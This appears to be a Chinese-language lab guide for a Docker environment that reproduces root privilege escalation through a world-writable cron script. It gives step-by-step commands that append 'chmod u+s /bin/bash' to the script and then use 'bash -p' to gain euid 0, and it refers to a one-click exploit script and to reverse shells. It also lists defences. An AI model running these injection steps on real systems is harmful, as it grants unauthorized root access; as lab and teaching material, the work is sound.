# Cron 计划任务提权（可写脚本）

## 原理

root 用户的 crontab 会周期性以 root 权限执行脚本。如果脚本文件本身（或脚本所在
目录）对普通用户可写，攻击者就能注入恶意代码（如 `chmod u+s /bin/bash` 或反弹
shell），等 cron 下一次执行时以 root 运行，完成提权。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/usr/local/bin/backup.sh 权限 777，root crontab 每分钟执行它

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 侦察: 发现可写的 root 任务脚本
ls -la /usr/local/bin/backup.sh
# 预期输出: -rwxrwxrwx 1 root root ... backup.sh   (777, 任何人可写)

# 4. 注入恶意代码 (给 /bin/bash 加 SUID)
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh

# 5. 等待 cron 执行 (最多 65 秒)
sleep 65

# 6. 验证提权
ls -l /bin/bash
# 预期输出: -rwsr-xr-x 1 root root ... /bin/bash   (SUID 位已设置)
/bin/bash -p -c 'id'
# 预期输出: uid=1000(lowpriv) ... euid=0(root)     提权成功!

# 7. 一键利用
bash exploit.sh
```

## 为什么能成功

- root 的 cron 以 root 身份执行 backup.sh
- 注入的 `chmod u+s /bin/bash` 由 root 执行, 给 bash 加上 SUID 位
- `/bin/bash -p` 保留 euid=0

## 踩坑记录

脚本权限必须是 777（可写 + 可执行）。如果只有 666（无 x 执行位），
cron 的 execve 会直接失败（EACCES），任务静默不执行。

## 防御

- root 任务脚本属主 root、权限 755
- 脚本内使用绝对路径
- 定期审计 /etc/crontab、crontab -l 与脚本目录权限

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
